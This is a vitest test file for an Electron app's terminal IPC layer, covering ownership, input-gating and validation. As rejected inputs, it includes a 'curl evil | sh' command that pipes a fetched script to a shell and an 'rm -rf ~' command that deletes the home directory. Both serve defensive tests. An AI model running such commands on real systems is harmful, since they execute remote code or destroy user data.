import { describe, expect, it } from 'vitest';

import { IPC_CHANNELS } from '../../shared/ipc.js';
import {
  INPUT_WINDOW_MS,
  MAX_SESSION_TERMINALS,
  registerTerminalHandlers,
  TerminalOwners,
  type NavigationDetails,
  type OwnerContents,
  type TerminalCore,
} from './terminal-ipc.js';

type Listener = (...args: never[]) => void;

class FakeContents implements OwnerContents {
  readonly #listeners = new Map<string, Listener[]>();
  constructor(readonly id: number) {}
  once(event: 'destroyed', listener: () => void): void {
    this.#add(event, listener);
  }
  on(event: string, listener: Listener): void {
    this.#add(event, listener);
  }
  #add(event: string, listener: Listener): void {
    this.#listeners.set(event, [...(this.#listeners.get(event) ?? []), listener]);
  }
  #emit(event: string, ...args: unknown[]): void {
    for (const listener of this.#listeners.get(event) ?? []) {
      (listener as (...a: unknown[]) => void)(...args);
    }
  }
  destroy(): void {
    this.#emit('destroyed');
  }
  crash(): void {
    this.#emit('render-process-gone');
  }
  navigate(details: NavigationDetails): void {
    this.#emit('did-start-navigation', details);
  }
  /** Real input as Electron reports it. */
  input(type = 'keyDown'): void {
    this.#emit('input-event', {}, { type });
  }
}

/** A Core with session terminals `sessionTerminals` (id → session) and page terminals. */
function setup(frame: () => Promise<Uint8Array> = () => Promise.resolve(new Uint8Array())) {
  const calls: string[] = [];
  const sessions = new Map<number, string>();
  let clock = 1000;
  let next = 1;
  const core: TerminalCore = {
    openSessionTerminal: (sessionId) => {
      const id = next++;
      sessions.set(id, sessionId);
      calls.push(`open ${sessionId}`);
      return Promise.resolve(
        JSON.stringify({ terminalId: id, taskId: `bg-${String(id)}`, restored: null }),
      );
    },
    setTerminalShared: (id, shared) => {
      calls.push(`share ${String(id)} ${String(shared)}`);
      return Promise.resolve(true);
    },
    closeTerminal: (id) => {
      sessions.delete(id);
      calls.push(`close ${String(id)}`);
    },
    terminalInput: (id, text) => calls.push(`input ${String(id)} ${text}`),
    terminalKey: (id, key) => calls.push(`key ${String(id)} ${key.code}`),
    terminalMouse: (id, event) => calls.push(`mouse ${String(id)} ${event.action}`),
    terminalFocus: (id, gained) => calls.push(`focus ${String(id)} ${String(gained)}`),
    terminalPaste: (id, text) => {
      calls.push(`paste ${String(id)} ${text}`);
      return Promise.resolve('pasted');
    },
    terminalResize: (id, cols, rows) =>
      calls.push(`resize ${String(id)} ${String(cols)}x${String(rows)}`),
    terminalFrame: (id, viewer, full, park) => {
      calls.push(
        `frame ${String(id)} viewer ${String(viewer)} full ${String(full)} park ${String(park)}`,
      );
      return frame();
    },
    terminalScroll: (id, to) => calls.push(`scroll ${String(id)} ${to}`),
    terminalClearSelection: (id) => calls.push(`clear ${String(id)}`),
    terminalSelectionText: () => Promise.resolve('selected'),
    terminalLinkAt: () =>
      Promise.resolve(JSON.stringify({ uri: 'https://example.com', row: 0, start: 1, end: 4 })),
    terminalSearch: () =>
      Promise.resolve(JSON.stringify([{ start: { row: 9, col: 0 }, end: { row: 9, col: 2 } }])),
    terminalText: () => Promise.resolve('screen'),
    terminalInfo: (id) => {
      const sessionId = sessions.get(id);
      if (sessionId === undefined && id >= 100) {
        // Page terminals (100+) exist without a session.
        return JSON.stringify(info(id));
      }
      if (sessionId === undefined) throw new Error('unknown terminal');
      return JSON.stringify({ ...info(id), sessionId, taskId: `bg-${String(id)}` });
    },
  };
  const handlers = new Map<
    string,
    (event: { readonly sender: OwnerContents }, args: readonly unknown[]) => unknown
  >();
  const owners = new TerminalOwners(core, () => clock);
  const stats = { requests: 0, frames: 0, bytes: 0, errors: 0 };
  registerTerminalHandlers(
    (channel, handler) => handlers.set(channel, handler),
    core,
    owners,
    stats,
  );
  const invoke = (contents: OwnerContents, channel: string, ...args: unknown[]) => {
    const handler = handlers.get(channel);
    if (handler === undefined) {
      throw new Error(`no handler for ${channel}`);
    }
    return handler({ sender: contents }, args);
  };
  const open = async (contents: FakeContents, session = 's1'): Promise<number> => {
    contents.input();
    const opened = (await invoke(contents, IPC_CHANNELS.terminalOpenSession, session, size)) as {
      terminalId: number;
    };
    return opened.terminalId;
  };
  return {
    calls,
    stats,
    owners,
    invoke,
    open,
    advance: (ms: number) => {
      clock += ms;
    },
    /** A window, watched from its creation as main.ts does (`web-contents-created`). */
    window: (id: number) => {
      const contents = new FakeContents(id);
      owners.watch(contents);
      return contents;
    },
  };
}

function info(id: number) {
  return {
    terminalId: id,
    cols: 80,
    rows: 24,
    title: '',
    pwd: '',
    alternateScreen: false,
    lastCommand: 0,
    shared: false,
  };
}

const size = { cols: 80, rows: 24, cellWidth: 8, cellHeight: 16 };
const key = { action: 'press', code: 'KeyA', text: 'a', mods: 0, composing: false };

describe('terminal IPC', () => {
  it('opens session terminals after real input and checks the arguments', async () => {
    const { calls, invoke, open, window } = setup();
    const win = window(1);
    await expect(
      invoke(win, IPC_CHANNELS.terminalOpenSession, 's1', size) as Promise<unknown>,
    ).rejects.toThrow('recent user input');
    await expect(open(win)).resolves.toBe(1);
    for (const [session, bad] of [
      ['../x', size],
      ['s1', { ...size, cols: 0 }],
      ['s1', { ...size, rows: 1001 }],
      ['s1', null],
    ]) {
      await expect(
        invoke(win, IPC_CHANNELS.terminalOpenSession, session, bad) as Promise<unknown>,
      ).rejects.toThrow(TypeError);
    }
    expect(calls).toEqual(['open s1']);
  });

  it('limits the open terminals of a session', async () => {
    const { invoke, open, window } = setup();
    const win = window(1);
    const ids: number[] = [];
    for (let i = 0; i < MAX_SESSION_TERMINALS; i += 1) {
      ids.push(await open(win));
    }
    await expect(open(win)).rejects.toThrow('at most');
    await expect(open(win, 's2')).resolves.toBeGreaterThan(0);
    // Closing one makes room again.
    invoke(win, IPC_CHANNELS.terminalClose, ids[0]);
    await expect(open(win)).resolves.toBeGreaterThan(0);
  });

  it('refuses writes without recent real input; pointer moves need none', async () => {
    const { calls, invoke, open, advance, window } = setup();
    const win = window(1);
    const id = await open(win);
    invoke(win, IPC_CHANNELS.terminalKey, id, key);
    advance(INPUT_WINDOW_MS + 1);
    expect(() => invoke(win, IPC_CHANNELS.terminalInput, id, 'curl evil | sh\r')).toThrow(
      'recent user input',
    );
    expect(() => invoke(win, IPC_CHANNELS.terminalKey, id, key)).toThrow('recent user input');
    expect(() =>
      invoke(win, IPC_CHANNELS.terminalMouse, id, {
        action: 'press',
        button: 1,
        mods: 0,
        x: 1,
        y: 1,
      }),
    ).toThrow('recent user input');
    expect(() => invoke(win, IPC_CHANNELS.terminalShare, id, true)).toThrow('recent user input');
    await expect(
      invoke(win, IPC_CHANNELS.terminalPaste, id, 'x', false) as Promise<unknown>,
    ).rejects.toThrow('recent user input');
    invoke(win, IPC_CHANNELS.terminalMouse, id, { action: 'motion', mods: 0, x: 1, y: 1 });
    // Pointer moves are not input that counts; a key or a click is.
    win.input('mouseMove');
    expect(() => invoke(win, IPC_CHANNELS.terminalInput, id, 'x')).toThrow('recent user input');
    win.input('mouseDown');
    invoke(win, IPC_CHANNELS.terminalInput, id, 'ls\r');
    expect(calls.filter((c) => !c.startsWith('open'))).toEqual([
      'key 1 KeyA',
      'mouse 1 motion',
      'input 1 ls\r',
    ]);
  });

  it('lets every win use a session terminal and keeps it across a reload', async () => {
    const { calls, invoke, open, owners, window } = setup();
    const first = window(1);
    const second = window(2);
    const id = await open(first);
    second.input();
    invoke(second, IPC_CHANNELS.terminalInput, id, 'pwd\r');
    first.navigate({ isMainFrame: true, isSameDocument: false });
    first.crash();
    expect(calls.some((c) => c.startsWith('close'))).toBe(false);
    first.input();
    invoke(first, IPC_CHANNELS.terminalInput, id, 'ls\r');
    expect(owners.mayObserve(2, `term/${String(id)}`)).toBe(true);
    // A terminal Core knows from the task snapshot (the agent's) is checked once with Core.
    expect(() => invoke(first, IPC_CHANNELS.terminalInput, 77, 'x')).toThrow('Unknown terminal');
  });

  it('keeps page terminals to their page and closes them when it goes away', () => {
    const { calls, invoke, owners, window } = setup();
    const owner = window(1);
    const other = window(2);
    owners.assign(100, owner);
    owner.input();
    other.input();
    invoke(owner, IPC_CHANNELS.terminalInput, 100, 'ls\r');
    expect(() => invoke(other, IPC_CHANNELS.terminalInput, 100, 'rm -rf ~\r')).toThrow(
      'Unknown terminal',
    );
    expect(owners.mayObserve(1, 'term/100')).toBe(true);
    expect(owners.mayObserve(2, 'term/100')).toBe(false);
    expect(owners.mayObserve(1, 'term/100x')).toBe(false);
    expect(owners.mayObserve(2, 'demo/1')).toBe(true);
    // A hash route change and a subframe navigation keep the page and its terminals.
    owner.navigate({ isMainFrame: true, isSameDocument: true });
    owner.navigate({ isMainFrame: false, isSameDocument: false });
    expect(calls).toEqual(['input 100 ls\r']);
    owner.navigate({ isMainFrame: true, isSameDocument: false });
    expect(calls).toEqual(['input 100 ls\r', 'close 100']);
  });

  it('closes a page terminal whose page went away while it started', () => {
    const { calls, owners, window } = setup();
    const win = window(1);
    const page = owners.page(win);
    win.navigate({ isMainFrame: true, isSameDocument: false });
    expect(owners.assign(101, win, page)).toBe(false);
    expect(calls).toEqual(['close 101']);
  });

  it('validates keys, input, pointer events, pastes and scroll targets', async () => {
    const { calls, invoke, open, window } = setup();
    const win = window(1);
    const id = await open(win);
    expect(() => invoke(win, IPC_CHANNELS.terminalKey, id, { ...key, action: 'tap' })).toThrow(
      TypeError,
    );
    expect(() => invoke(win, IPC_CHANNELS.terminalInput, id, 42)).toThrow(TypeError);
    expect(() => invoke(win, IPC_CHANNELS.terminalInput, id, 'x'.repeat(64 * 1024 + 1))).toThrow(
      TypeError,
    );
    for (const bad of [
      { action: 'tap', mods: 0, x: 0, y: 0 },
      { action: 'press', button: 12, mods: 0, x: 0, y: 0 },
      { action: 'press', mods: 0, x: Number.NaN, y: 0 },
      { action: 'press', mods: 0, x: 0, y: 0, clicks: 4 },
    ]) {
      expect(() => invoke(win, IPC_CHANNELS.terminalMouse, id, bad)).toThrow(TypeError);
    }
    for (const bad of [{ kind: 'left' }, { kind: 'delta', rows: 1.5 }, { kind: 'row', row: -1 }]) {
      expect(() => invoke(win, IPC_CHANNELS.terminalScroll, id, bad)).toThrow(TypeError);
    }
    invoke(win, IPC_CHANNELS.terminalScroll, id, { kind: 'delta', rows: -3 });
    await expect(
      invoke(win, IPC_CHANNELS.terminalPaste, id, 'echo hi', false) as Promise<unknown>,
    ).resolves.toBe('pasted');
    invoke(win, IPC_CHANNELS.terminalResize, id, { ...size, cols: 100 });
    expect(calls.slice(1)).toEqual([
      'scroll 1 {"kind":"delta","rows":-3}',
      'paste 1 echo hi',
      'resize 1 100x24',
    ]);
  });

  it('returns each frame unread, one request in flight per win and terminal', async () => {
    const frame = new Uint8Array([0x50, 0x54, 0x46, 1]);
    let release: () => void = () => undefined;
    const held = new Promise<void>((resolve) => {
      release = resolve;
    });
    const { calls, stats, invoke, open, window } = setup(() => held.then(() => frame));
    const win = window(7);
    const other = window(8);
    const id = await open(win);
    const reply = invoke(win, IPC_CHANNELS.terminalRequestFrame, id, true, true);
    expect(() => invoke(win, IPC_CHANNELS.terminalRequestFrame, id, false)).toThrow('in flight');
    const otherReply = invoke(other, IPC_CHANNELS.terminalRequestFrame, id, true);
    release();
    await expect(reply).resolves.toBe(frame);
    await expect(otherReply).resolves.toBe(frame);
    expect(calls).toContain('frame 1 viewer 7 full true park true');
    expect(calls).toContain('frame 1 viewer 8 full true park false');
    expect(stats).toEqual({ requests: 2, frames: 2, bytes: 8, errors: 0 });
    await expect(
      invoke(win, IPC_CHANNELS.terminalRequestFrame, id, false) as Promise<unknown>,
    ).resolves.toBe(frame);
    expect(() => invoke(win, IPC_CHANNELS.terminalRequestFrame, id, 'yes')).toThrow(TypeError);
  });

  it('rejects the request when Core cannot produce a frame, and the next one may follow', async () => {
    const { stats, invoke, open, window } = setup(() => Promise.reject(new Error('vt failed')));
    const win = window(3);
    const id = await open(win);
    await expect(
      invoke(win, IPC_CHANNELS.terminalRequestFrame, id, false) as Promise<unknown>,
    ).rejects.toThrow('vt failed');
    await expect(
      invoke(win, IPC_CHANNELS.terminalRequestFrame, id, false) as Promise<unknown>,
    ).rejects.toThrow('vt failed');
    expect(stats.errors).toBe(2);
  });

  it('parses the selection, links, matches, screen text and information', async () => {
    const { invoke, open, window } = setup();
    const win = window(1);
    const id = await open(win);
    await expect(invoke(win, IPC_CHANNELS.terminalSelectionText, id)).resolves.toBe('selected');
    await expect(invoke(win, IPC_CHANNELS.terminalLinkAt, id, 2, 0)).resolves.toEqual({
      uri: 'https://example.com',
      row: 0,
      start: 1,
      end: 4,
    });
    expect(() => invoke(win, IPC_CHANNELS.terminalLinkAt, id, -1, 0)).toThrow(TypeError);
    await expect(invoke(win, IPC_CHANNELS.terminalSearch, id, 'ab')).resolves.toEqual([
      { start: { row: 9, col: 0 }, end: { row: 9, col: 2 } },
    ]);
    await expect(invoke(win, IPC_CHANNELS.terminalSearch, id, '')).resolves.toEqual([]);
    expect(() => invoke(win, IPC_CHANNELS.terminalSearch, id, 'x'.repeat(1001))).toThrow(TypeError);
    await expect(invoke(win, IPC_CHANNELS.terminalScreenText, id)).resolves.toBe('screen');
    expect(invoke(win, IPC_CHANNELS.terminalInfo, id)).toMatchObject({
      terminalId: id,
      sessionId: 's1',
      shared: false,
    });
  });
});
